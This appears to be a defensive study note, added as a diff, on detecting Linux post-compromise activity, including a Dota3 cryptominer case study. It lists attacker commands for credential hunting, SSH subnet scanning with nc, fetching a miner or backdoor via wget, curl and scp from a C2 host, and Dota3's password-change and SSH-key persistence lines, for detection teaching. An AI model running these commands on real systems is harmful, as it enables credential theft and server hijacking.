@@ -1,0 +1,146 @@
+# Linux Threat Detection 2
+
+## Overview
+After initial access (often automated by botnets), human attackers take over Linux systems to perform discovery, persistence, and impact actions. These are commonly **"Hack and Forget"** attacks focused on fast monetization or abuse.
+
+---
+
+## Attack Stages
+1. **Initial Access (Botnet)**
+   - Internet-wide scanning (e.g., SSH)
+   - Brute-force weak credentials
+2. **Discovery (Human or Scripted)**
+   - Environment, users, processes, and network enumeration
+3. **Impact (Human)**
+   - Cryptomining, botnet enrollment, proxy abuse
+
+---
+
+## First Discovery Commands
+Attackers commonly execute these immediately after access:
+
+### OS & Filesystem
+- `pwd`, `ls /`, `env`
+- `uname -a`, `lsb_release -a`, `hostname`
+
+### Users & Groups
+- `whoami` ⭐ (high-fidelity detection signal)
+- `id`, `w`, `last`
+- `cat /etc/passwd`, `cat /etc/sudoers`
+
+### Processes & Network
+- `ps aux`, `top`
+- `ip a`, `ip r`, `arp -a`
+- `ss -tnlp`, `netstat -tnlp`
+
+### Cloud / Sandbox Detection
+- `systemd-detect-virt`
+- `lsmod`, `uptime`
+- `pgrep <edr-or-sandbox>`
+
+---
+
+## Specialized Discovery by Objective
+### Credential Theft
+- `history | grep pass`
+- `find / -name .env`
+- `find /home -name id_rsa`
+
+### Cryptomining Suitability
+- `cat /proc/cpuinfo`
+- `lscpu | grep Model`
+- `free -m`, `top`, `htop`
+
+### Lateral Movement
+- `ping <ip>`
+- `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22; done`
+
+---
+
+## Detection of Discovery
+### Primary Tools
+- **auditd**: process execution logging
+- **Auth logs**: `/var/log/auth.log`
+
+### Key Technique
+- Build **process trees** to understand command origin
+- Example red flag: `whoami` spawned by a web server or temp script
+
+---
+
+## "Hack and Forget" Attack Goals
+- **Install Cryptominers** (CPU/GPU abuse)
+- **Enroll in Botnets** (e.g., Mirai)
+- **Use as Proxy** (phishing, malware hosting, traffic relay)
+
+---
+
+## Ingress Tool Transfer (MITRE)
+Attackers usually rely on built-in tools:
+
+### Common Commands
+- `wget https://... -O /tmp/miner.tar.gz`
+- `curl --output backdoor.php https://...`
+- `scp user@c2:/tool.sh /tmp/tool.sh`
+
+### Detection Notes
+- SCP from attacker → victim may **not** appear in auditd
+- Detect via:
+  - New SSH logins
+  - File creation in `/tmp`, `/var/tmp`
+
+---
+
+## Dota3 Cryptominer Case Study
+
+### Initial Access
+- SSH brute-force by botnet (2000+ IPs)
+- Targets root & weak passwords
+
+### Discovery (Automated)
+```bash
+cat /proc/cpuinfo | grep name
+free -m
+lscpu | grep Model
+uname -m
+crontab -l
+w
+```
+
+### Persistence
+```bash
+echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS" | passwd | bash
+rm -rf ~/.ssh
+echo "ssh-rsa [key] mdrfckr" >> ~/.ssh/authorized_keys
+```
+
+### Malware Staging
+- Hidden directories in `/tmp`:
+```bash
+mkdir /tmp/.X26-unix
+tar xf dota3.tar.gz
+```
+
+### Execution
+```bash
+nohup tsm -p 22 192.168 &
+nohup initall &   # XMRig cryptominer
+```
+
+---
+
+## Detection Indicators
+- Hidden directories in `/tmp`
+- Suspicious filenames (e.g., `dota3.tar.gz`)
+- `nohup` usage
+- Internal SSH scanning (192.168.*, 172.16.*)
+- Known strings (e.g., `mdrfckr`)
+- EDR detection of XMRig
+
+---
+
+## Key Takeaways
+- Linux attacks heavily abuse native tools
+- `whoami` is a strong early indicator
+- auditd + auth logs + process trees are critical
+- "Hack and Forget" attacks are fast, scalable, and common
